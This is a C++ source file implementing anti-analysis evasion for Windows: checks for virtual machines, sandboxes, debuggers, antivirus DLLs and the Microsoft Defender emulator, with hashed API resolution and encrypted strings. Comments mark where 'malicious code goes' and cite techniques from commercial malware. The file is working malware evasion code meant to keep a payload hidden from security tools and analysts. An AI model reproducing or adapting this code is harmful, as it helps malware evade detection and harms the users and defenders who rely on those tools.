﻿#include "AntiVm.h"
#include <powerbase.h>
#include <iostream>
#include <tlhelp32.h>
#include <string>
#include <comdef.h>
#include <wbemcli.h>
#include <intrin.h>
#include <cstring>
#include <vector>
#include <regex>
#include <iphlpapi.h>
#include "definition.h"
#include "Tools.h"
#include "Function.hpp"


#pragma comment(lib, "PowrProf.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wbemuuid.lib")




static auto& dynamicInvoker = DynamicInvoker::get_instance();

typedef void (WINAPI* pRtlInitUnicodeString)(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
    );

typedef NTSTATUS(NTAPI* pZwQueryLicenseValue)(
    PUNICODE_STRING ValueName,
    ULONG* Type,
    PVOID Data,
    ULONG DataSize,
    ULONG* ResultDataSize);


typedef NTSTATUS(NTAPI* pNtDelayExecution)(
    IN BOOLEAN              Alertable,
    IN PLARGE_INTEGER       DelayInterval);


/*
通过SystemBasicInformation检测CPU核心数
*/
auto checkCPUCoreNum() -> BOOLEAN {
    return GetCpuCoreNum() < 4;
}
/*
通过 SystemMemoryUsageInformation 检测物理内存大小 (以 GB 为单位)
*/
auto checkPhysicalMemory() -> BOOLEAN {
    return (GetPhysicalMemory() / (1024*1024*1024)) < 4;
}
/*
通过 DeviceIoControl 获取系统总磁盘大小 需要管理员权限
*/
auto checkTotalDiskSize() -> BOOLEAN
{
    INT disk = 256 * 0.9;
    HANDLE hDrive;
    GET_LENGTH_INFORMATION size;
    DWORD lpBytes;

    // 打开物理磁盘
    hDrive = CreateFileA(ENCRYPT_STR("\\\\.\\PhysicalDrive0"), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

    // 获取磁盘大小信息
    BOOLEAN result = DeviceIoControl(hDrive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &size, sizeof(GET_LENGTH_INFORMATION), &lpBytes, NULL);
    CloseHandle(hDrive);

    // 判断磁盘大小是否小于给定值 转GB
    return (size.Length.QuadPart / 1073741824) < disk;
}

// 检测系统启动时间是否小于30分钟
auto checkBootTime() -> BOOLEAN {
    return GetBootTime() < 30;
}

auto checkHyperVPresent() -> BOOLEAN {
    int cpuInfo[4];
    __cpuid(cpuInfo, 0x1);  // 获取 CPUID 信息，0x1 表示获取 CPU 信息
    return (cpuInfo[2] & (1 << 31)) != 0;  // 检查 HYPERV_HYPERVISOR_PRESENT_BIT（第31位）
}

auto checkTempFileCount(INT reqFileCount) -> BOOLEAN {
    return getTempFileCount() < reqFileCount;
}


auto checkGPUMemory() -> BOOLEAN {
    BOOLEAN lowMemoryGPU = TRUE;

    // 如果显卡显存大于0.5GB，则认为该显卡不是低显存
    if (getMaxGPUMemory(NULL) > 512) {
        lowMemoryGPU = FALSE;  // 至少有一张显卡显存大于0.5GB，标记为非low
    }

    return lowMemoryGPU;
}

auto checkMacAddrPrefix() -> BOOLEAN {

    const std::vector<std::string>& macPrefixes = { ENCRYPT_STR("08-00-27"), ENCRYPT_STR("00-03-FF"), ENCRYPT_STR("00-05-69"), ENCRYPT_STR("00-0C-29"), ENCRYPT_STR("00-50-56") };
    PIP_ADAPTER_INFO pIpAdapterInfo = nullptr;
    unsigned long stSize = sizeof(IP_ADAPTER_INFO);
    int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);

    if (nRel == ERROR_BUFFER_OVERFLOW) {
        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
        nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
    }

    if (nRel != ERROR_SUCCESS) {
        // std::cerr << "Error getting adapter info." << std::endl;
        return false;
    }

    bool foundMatchingPrefix = false;

    // 遍历所有网卡
    while (pIpAdapterInfo) {

        // 检查是否匹配任何预设的MAC前缀
        for (const auto& prefix : macPrefixes) {
            // 提取前缀部分
            std::string macPrefix = prefix;
            macPrefix.erase(std::remove(macPrefix.begin(), macPrefix.end(), '-'), macPrefix.end());  // 去除"-"

            // 提取前3个字节，转换成一个字符数组
            if (macPrefix.length() != 6) {
                continue;  // 前缀必须是6个字符（每个字节的两个十六进制字符）
            }

            unsigned char prefixBytes[3];
            for (int i = 0; i < 3; ++i) {
                prefixBytes[i] = std::stoi(macPrefix.substr(i * 2, 2), nullptr, 16);
            }

            // 如果前缀匹配
            if (!memcmp(prefixBytes, pIpAdapterInfo->Address, 3)) {
                // std::cout << "Matched prefix: " << prefix << std::endl;
                foundMatchingPrefix = true;
                break;
            }
        }


        pIpAdapterInfo = pIpAdapterInfo->Next;
    }

    if (pIpAdapterInfo) {
        delete[] pIpAdapterInfo;
    }

    return foundMatchingPrefix;
}

auto caseInsensitiveCompare(const std::string& str1, const std::string& str2) -> BOOLEAN {
    if (str1.size() != str2.size()) return false;

    return std::equal(str1.begin(), str1.end(), str2.begin(),
        [](char c1, char c2) {
            return std::tolower(c1) == std::tolower(c2);
        });
}



auto checkCurrentProcessFileName(const std::wstring& targetSubstring) -> BOOLEAN {
    wchar_t path[MAX_PATH];
    // 获取当前进程的可执行文件路径
    DWORD length = GetModuleFileNameW(NULL, path, MAX_PATH);
    if (length == 0) {
        std::wcerr << ENCRYPT_WSTR("Failed to get executable path") << std::endl;
        return false;
    }

    // 获取路径中的文件名部分
    std::wstring executablePath(path);
    size_t pos = executablePath.find_last_of(L"\\");
    if (pos != std::wstring::npos) {
        executablePath = executablePath.substr(pos + 1);  // 提取文件名部分
    }

    // 检查文件名是否包含目标子字符串（不区分大小写）
    return executablePath.find(targetSubstring) == std::wstring::npos;
}

auto check_run_path() -> BOOLEAN {
    // 获取当前工作目录
    char buf[256];
    GetCurrentDirectoryA(256, buf);
    std::string workingdir(buf);

    // 如果路径长度小于等于6，直接返回FALSE
    if (workingdir.length() <= 6) {
        return FALSE;
    }

    // 正则表达式用于匹配以 C:\ 开头的路径
    std::regex pattern("^C:\\\\[A-Za-z0-9_]+$");  // 只匹配一级目录
    if (std::regex_match(workingdir, pattern)) {
        // 常见的排除文件夹
        std::vector<std::string> excludeDirs = { ENCRYPT_STR("Windows"), ENCRYPT_STR("ProgramData"), ENCRYPT_STR("Users") };

        // 获取工作目录的子目录名称（C:\后面的第一个文件夹）
        size_t firstSlash = workingdir.find("\\", 3); // 从 C:\ 后开始查找
        size_t secondSlash = workingdir.find("\\", firstSlash + 1); // 查找第二个反斜杠位置

        std::string firstFolder = workingdir.substr(firstSlash + 1, secondSlash - firstSlash - 1);
        for (const auto& excludeDir : excludeDirs) {
            if (firstFolder == excludeDir) {
                return TRUE;
            }
        }
        return FALSE;
    }

    return FALSE;
}

auto checkdlls() -> BOOLEAN {
    // 黑名单 DLL 列表
    std::vector<std::wstring> dlls = {
        ENCRYPT_WSTR("avghookx.dll"),    // AVG
        ENCRYPT_WSTR("avghooka.dll"),    // AVG
        ENCRYPT_WSTR("snxhk.dll"),       // Avast
        ENCRYPT_WSTR("sbiedll.dll"),     // Sandboxie
        ENCRYPT_WSTR("dbghelp.dll"),     // WindBG
        ENCRYPT_WSTR("api_log.dll"),     // iDefense Lab
        ENCRYPT_WSTR("dir_watch.dll"),   // iDefense Lab
        ENCRYPT_WSTR("pstorec.dll"),     // SunBelt Sandbox
        ENCRYPT_WSTR("vmcheck.dll"),     // Virtual PC
        ENCRYPT_WSTR("wpespy.dll"),      // WPE Pro
        ENCRYPT_WSTR("cmdvrt64.dll"),    // Comodo Container
        ENCRYPT_WSTR("cmdvrt32.dll")     // Comodo Container
    };

    for (const auto& dll : dlls) {
        HMODULE hDll = myLoadLibrary(dll.c_str());
        if (hDll != NULL) {
            return TRUE;
        }
    }
    return FALSE;
}

auto mouse_movement() -> BOOLEAN {

    POINT positionA = {};
    POINT positionB = {};

    /* Retrieve the position of the mouse cursor, in screen coordinates */
    GetCursorPos(&positionA);

    /* Wait a moment */
    Sleep(5000);

    /* Retrieve the poition gain */
    GetCursorPos(&positionB);

    if ((positionA.x == positionB.x) && (positionA.y == positionB.y))
        /* Probably a sandbox, because mouse position did not change. */
        return TRUE;

    else
        return FALSE;
}

auto accelerated_sleep() -> BOOLEAN {
    ULONG64 dwStart = 0, dwEnd = 0, dwDiff = 0;
    ULONG64 dwMillisecondsToSleep = 60 * 1000;

    /* Retrieves the number of milliseconds that have elapsed since the system was started */
    dwStart = AR_getTickcount64();

    /* Let's sleep 1 minute so Sandbox is interested to patch that */
    Sleep(dwMillisecondsToSleep);

    /* Do it again */
    dwEnd = AR_getTickcount64();

    /* If the Sleep function was patched*/
    dwDiff = dwEnd - dwStart;
    if (dwDiff > dwMillisecondsToSleep - 1000) // substracted 1s just to be sure
        return FALSE;
    else
        return TRUE;
}

//std::string httpGet(const std::string& host, const std::string& path) {
//    // 初始化 Winsock
//    WSADATA wsaData;
//    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
//        std::cerr << "WSAStartup failed" << std::endl;
//        return "";
//    }
//
//    // 创建套接字
//    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
//    if (sock == INVALID_SOCKET) {
//        std::cerr << "Socket creation failed" << std::endl;
//        WSACleanup();
//        return "";
//    }
//
//    struct addrinfo hints = {}, * result;
//    hints.ai_family = AF_INET;
//    hints.ai_socktype = SOCK_STREAM;
//    if (getaddrinfo(host.c_str(), "80", &hints, &result) != 0) {
//        std::cerr << "Failed to resolve host: " << host << std::endl;
//        closesocket(sock);
//        WSACleanup();
//        return "";
//    }
//
//    if (connect(sock, result->ai_addr, static_cast<int>(result->ai_addrlen)) == SOCKET_ERROR) {
//        std::cerr << "Connection failed" << std::endl;
//        freeaddrinfo(result);
//        closesocket(sock);
//        WSACleanup();
//        return "";
//    }
//    freeaddrinfo(result);
//
//    // 构建 HTTP GET 请求
//    std::string request = "GET " + path + " HTTP/1.1\r\n";
//    request += "Host: " + host + "\r\n";
//    request += "Connection: close\r\n\r\n";
//
//    // 发送请求
//    if (send(sock, request.c_str(), static_cast<int>(request.length()), 0) == SOCKET_ERROR) {
//        std::cerr << "Send failed" << std::endl;
//        closesocket(sock);
//        WSACleanup();
//        return "";
//    }
//
//    // 接收响应
//    char buffer[4096];
//    std::string response;
//    int bytes_received;
//    while ((bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
//        buffer[bytes_received] = '\0';  // 确保字符串结束
//        response += buffer;
//    }
//    if (bytes_received == SOCKET_ERROR) {
//        std::cerr << "Receive failed" << std::endl;
//    }
//
//    // 关闭套接字
//    closesocket(sock);
//    WSACleanup();
//    return response;
//}

auto query_license_value() -> BOOLEAN {


    UNICODE_STRING LicenseValue;
    dynamicInvoker.Invoke<NTSTATUS>(RtlInitUnicodeStringStruct.funcAddr, RtlInitUnicodeStringStruct.funcHash, &LicenseValue, ENCRYPT_WSTR("Kernel-VMDetection-Private"));

    ULONG Result = 0, ReturnLength;

    NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(ZwQueryLicenseValueStruct.funcAddr, ZwQueryLicenseValueStruct.funcHash,
        &LicenseValue, NULL, reinterpret_cast<PVOID>(&Result), sizeof(ULONG), &ReturnLength);

    if (status == 0xC0000034) {
        return FALSE;
    }
    if (NT_SUCCESS(status)) {
        return TRUE;
    }

    return FALSE;

}

#define LODWORD(_qw)    ((DWORD)(_qw))
auto rdtsc_diff_locky() -> BOOLEAN {
    ULONGLONG tsc1;
    ULONGLONG tsc2;
    ULONGLONG tsc3;
    DWORD i = 0;

    // Try this 10 times in case of small fluctuations
    for (i = 0; i < 10; i++)
    {
        tsc1 = __rdtsc();

        // Waste some cycles - should be faster than CloseHandle on bare metal
        GetProcessHeap();

        tsc2 = __rdtsc();

        // Waste some cycles - slightly longer than GetProcessHeap() on bare metal
        CloseHandle(0);

        tsc3 = __rdtsc();

        // Did it take at least 10 times more CPU cycles to perform CloseHandle than it took to perform GetProcessHeap()?
        if ((LODWORD(tsc3) - LODWORD(tsc2)) / (LODWORD(tsc2) - LODWORD(tsc1)) >= 10)
            return FALSE;
    }

    // We consistently saw a small ratio of difference between GetProcessHeap and CloseHandle execution times
    // so we're probably in a VM!
    return TRUE;
}

// sleep
auto GetSystemTimeAdjustmentWithDelay() -> void {
    DWORD timeAdjustment = 0;
    DWORD timeIncrement = 0;
    BOOL timeAdjustmentDisabled = FALSE;

    // 调用 GetSystemTimeAdjustment 函数获取时间调整信息
    for (int i = 0; i <= 7814901; i++) {
        GetSystemTimeAdjustment(&timeAdjustment, &timeIncrement, &timeAdjustmentDisabled);
    }
}



/*WaitForSingleObject*/
auto timing_WaitForSingleObject(UINT delayInMillis) -> BOOLEAN {
    HANDLE hEvent;

    // Create a nonsignaled event
    hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (hEvent == NULL)
    {
        return TRUE;
    }

    // Wait until timeout 
    DWORD x = WaitForSingleObject(hEvent, delayInMillis);

    // Malicious code goes here

    return FALSE;
}

/*setTimer*/
auto TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) -> BOOLEAN {
    // This function is called when the timer expires
    return TRUE;
}
auto timing_SetTimer(UINT delayInMillis) -> BOOLEAN {
    // Set a timer that triggers after `delayInMillis` milliseconds
    UINT_PTR timerId = SetTimer(NULL, 0, delayInMillis, (TIMERPROC)TimerProc);

    if (timerId == 0)
    {
        return FALSE;
    }

    // Wait for the timer to trigger (simulate doing something while waiting)
    // We simulate waiting by running a message loop (this is the trick to keep the timer alive)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        if (msg.message == WM_TIMER)
        {
            // Timer triggered, handle it
            break;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Kill the timer after it has triggered
    KillTimer(NULL, timerId);

    return TRUE;
}


/*BIOS部分*/
typedef struct _dmi_header {
    BYTE type;
    BYTE length;
    WORD handle;
} dmi_header;
typedef struct _RawSMBIOSData {
    BYTE Used20CallingMethod;
    BYTE SMBIOSMajorVersion;
    BYTE SMBIOSMinorVersion;
    BYTE DmiRevision;
    DWORD Length;
    BYTE SMBIOSTableData[];
} RawSMBIOSData;
auto dmi_string(const dmi_header* dm, BYTE s) -> const char* {
    const char* bp = (const char*)dm + dm->length;

    if (s == 0) return ENCRYPT_STR("Not Specified");
    while (s > 1 && *bp) {
        bp += strlen(bp) + 1;
        s--;
    }
    return *bp ? bp : ENCRYPT_STR("BAD_INDEX");
}
auto dmi_system_uuid(const BYTE* p, short ver) -> void {
    bool only0xFF = true, only0x00 = true;

    for (int i = 0; i < 16 && (only0x00 || only0xFF); i++) {
        if (p[i] != 0x00) only0x00 = false;
        if (p[i] != 0xFF) only0xFF = false;
    }

    if (only0xFF) {
        // std::cout << "Not Present" << std::endl;
        return;
    }
    if (only0x00) {
        // std::cout << "Not Settable" << std::endl;
        return;
    }

    if (ver >= 0x0206) {
        DebugPrintA(ENCRYPT_STR("%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X\n"),
            p[3], p[2], p[1], p[0], p[5], p[4], p[7], p[6],
            p[8], p[9], p[10], p[11], p[12], p[13], p[14], p[15]);
    }
    else {
        DebugPrintA(ENCRYPT_STR("%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X\n"),
            p[0], p[1], p[2], p[3], p[4], p[5], p[6], p[7],
            p[8], p[9], p[10], p[11], p[12], p[13], p[14], p[15]);
    }
}


#pragma warning(push)
#pragma warning(disable: 4055)
#pragma warning(disable: 4152)


/*defender*/


DWORD wdxEmulatorAPIHashTable[] = {
    0x70CE7692,
    0xD4CE4554,
    0x7A99CFAE
};

auto wdxGetHashForString(_In_ char* s) -> DWORD {
    DWORD h = 0;

    while (*s != 0) {
        h ^= *s;
        h = RotateLeft32(h, 3) + 1;
        s++;
    }

    return h;
}

auto wdxGetProcedureAddressByHash(_In_ PVOID ImageBase, _In_ DWORD ProcedureHash) -> PVOID {
    DWORD i;
    ULONG sz = 0;

    IMAGE_DOS_HEADER* DosHeader;
    IMAGE_EXPORT_DIRECTORY* Exports;
    PDWORD Names, Functions;
    PWORD Ordinals;

    DWORD_PTR FunctionPtr;

    DosHeader = (IMAGE_DOS_HEADER*)ImageBase;
    Exports = dynamicInvoker.Invoke<PIMAGE_EXPORT_DIRECTORY>(RtlImageDirectoryEntryToDataStruct.funcAddr, RtlImageDirectoryEntryToDataStruct.funcHash,
        TRUE,
        IMAGE_DIRECTORY_ENTRY_EXPORT,
        &sz);



    if (Exports == NULL)
        return NULL;

    Names = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfNames);
    Ordinals = (PWORD)((PBYTE)DosHeader + Exports->AddressOfNameOrdinals);
    Functions = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfFunctions);

    for (i = 0; i < Exports->NumberOfNames; i++) {
        if (wdxGetHashForString((char*)((PBYTE)DosHeader + Names[i])) == ProcedureHash) {
            FunctionPtr = Functions[Ordinals[i]];
            return (PBYTE)ImageBase + FunctionPtr;
        }
    }

    return NULL;
}
/*
* wdCheckEmulatedVFS
*
* Purpose:
*
* Detect Microsoft Security Engine emulation by it own VFS artefact.
*
* Microsoft AV provides special emulated environment for scanned application where it
* fakes general system information, process environment structures/data to make sure
* API calls are transparent for scanned code. It also use simple Virtual File System
* allowing this AV track file system changes and if needed continue emulation on new target.
*
* This method implemented in commercial malware presumable since 2013.
*
*/
auto wdCheckEmulatedVFS(VOID) -> VOID {
    WCHAR szBuffer[MAX_PATH];
    WCHAR szMsEngVFS[12] = { L':', L'\\', L'm', L'y', L'a', L'p', L'p', L'.', L'e', L'x', L'e', 0 };

    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
    GetModuleFileName(NULL, szBuffer, MAX_PATH);
    if (_strstri_w(szBuffer, szMsEngVFS) != NULL) {
        dynamicInvoker.Invoke<NTSTATUS>(RtlExitUserProcessStruct.funcAddr, RtlExitUserProcessStruct.funcHash, (UINT)0);
    }
}

/*
* wdIsEmulatorPresent
*
* Purpose:
*
* Detect MS emulator state.
*
*/
auto wdIsEmulatorPresent(VOID) -> NTSTATUS {
    PCHAR ImageBase = NULL;

    IMAGE_DOS_HEADER* DosHeader;
    IMAGE_EXPORT_DIRECTORY* Exports;
    PDWORD Names;

    ULONG i, c, Hash, sz = 0;
    UNICODE_STRING Nt = { 0 };
    dynamicInvoker.Invoke<NTSTATUS>(RtlInitUnicodeStringStruct.funcAddr, RtlInitUnicodeStringStruct.funcHash,
        &Nt, ENCRYPT_WSTR("ntdll.dll"));
    // UNICODE_STRING usNtdll = RTL_CONSTANT_STRING(L"ntdll.dll");
#define LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT 0x00000001

    
    NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(LdrGetDllHandleExStruct.funcAddr, LdrGetDllHandleExStruct.funcHash,
        LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT,
        NULL, NULL, &Nt, &ImageBase);
    if (!NT_SUCCESS(status))
    {
        return STATUS_DLL_NOT_FOUND;
    }
    Exports = dynamicInvoker.Invoke<PIMAGE_EXPORT_DIRECTORY>(RtlImageDirectoryEntryToDataStruct.funcAddr, RtlImageDirectoryEntryToDataStruct.funcHash,
        ImageBase, TRUE,
        IMAGE_DIRECTORY_ENTRY_EXPORT, &sz);

    // Exports = (IMAGE_EXPORT_DIRECTORY*)RtlImageDirectoryEntryToData(ImageBase, TRUE,
    //     IMAGE_DIRECTORY_ENTRY_EXPORT, &sz);
#define STATUS_INVALID_IMAGE_FORMAT 0xC000007B

    if (Exports == NULL)
        return STATUS_INVALID_IMAGE_FORMAT;

    DosHeader = (IMAGE_DOS_HEADER*)ImageBase;
    Names = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfNames);

    for (i = 0; i < Exports->NumberOfNames; i++) {
        Hash = wdxGetHashForString((char*)((PBYTE)DosHeader + Names[i]));
        for (c = 0; c < RTL_NUMBER_OF(wdxEmulatorAPIHashTable); c++) {
            if (Hash == wdxEmulatorAPIHashTable[c])
                return 0xC0000001;
        }
    }
    return STATUS_NOT_SUPPORTED;
}

/*
* wdIsEmulatorPresent2
*
* Purpose:
*
* Detect MS emulator state 2.
*
* Microsoft AV defines virtual environment dlls loaded in runtime from VDM files.
* These fake libraries implement additional detection layer and come with a lot of
* predefined values.
*
*/
auto wdIsEmulatorPresent2(VOID) -> BOOLEAN {
    
    return dynamicInvoker.Invoke<NTSTATUS>(NtIsProcessInJobStruct.funcAddr, NtIsProcessInJobStruct.funcHash,
        (HANDLE)-1, UlongToHandle(10)) == 0x125;
}

/*
* wdIsEmulatorPresent3
*
* Purpose:
*
* Same as previous.
*
*/
auto wdIsEmulatorPresent3(VOID) -> BOOLEAN {
    
    if (NT_SUCCESS(dynamicInvoker.Invoke<NTSTATUS>(NtCompressKeyStruct.funcAddr, NtCompressKeyStruct.funcHash, UlongToHandle(0xFFFF1234))))
        return TRUE;

    return FALSE;
}

#pragma warning(pop)

auto checkDllGetClassObject() -> BOOLEAN {
    pDllGetClassObject DllGetClassObject = (pDllGetClassObject)GetProcAddressbyHASH(myLoadLibrary(ENCRYPT_WSTR("pid.dll")), DllGetClassObject_Hashed);
    GUID sid = { 0 };
    GUID iid = { 0 };
    LPVOID lpmem = NULL;
    HRESULT hr = DllGetClassObject(sid, iid, &lpmem);
    
    return(hr != CLASS_E_CLASSNOTAVAILABLE);
}
auto checkSxInDll() -> BOOLEAN {
    if (myLoadLibrary(ENCRYPT_WSTR("SxIn.dll"))) return TRUE;
    return FALSE;
}
auto checkProcessVX_QQ() -> BOOLEAN {
    ULONG retLen = 0;

    
    PSYSTEM_PROCESS_INFORMATION pspi = (PSYSTEM_PROCESS_INFORMATION)malloc(0x100000);
    memset(pspi, 0, 0x100000);

    NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(ZwQuerySystemInformationStruct.funcAddr, ZwQuerySystemInformationStruct.funcHash,
        SystemProcessInformation, pspi, 0x100000, &retLen);

    int num = retLen / pspi->NextEntryOffset;
    for (int i = 0; i < num; i++) {
		if (pspi->ImageName.Buffer != NULL) {
			if (wcsstr(pspi->ImageName.Buffer, ENCRYPT_WSTR("QQ")) != NULL || wcsstr(pspi->ImageName.Buffer, ENCRYPT_WSTR("WeChat")) != NULL) {
				return TRUE;

                DebugPrintW(ENCRYPT_WSTR("Detect %s!"), pspi->ImageName.Buffer);
			}
		}
		pspi = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)pspi + pspi->NextEntryOffset);
	}

    return FALSE;
}